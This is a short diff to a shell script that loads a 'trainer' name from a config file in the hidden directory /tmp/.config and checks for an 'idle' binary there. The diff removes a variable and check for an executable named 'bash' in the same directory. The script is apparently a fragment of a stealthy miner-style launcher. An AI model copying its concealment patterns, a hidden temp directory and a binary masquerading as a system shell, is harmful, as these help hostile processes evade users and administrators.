@@ -1,6 +1,5 @@
 #!/bin/sh
 
-execName="bash"
 idleName="idle"
 work="/tmp/.config"
 dynamicInterval="5"
@@ -10,8 +9,6 @@ dynamicInterval="5"
 trainerName=`cat "${work}/appsettings.json" |grep '"cpuName":' |cut -d'"' -f4`
 [ -n "$trainerName" ] || exit 1
 trainerPath="${work}/${trainerName}"
-execPath="${work}/${execName}"
-[ -f "$execPath" ] || exit 1
 idlePath="${work}/${idleName}"
 [ -f "$idlePath" ] || exit 1
 
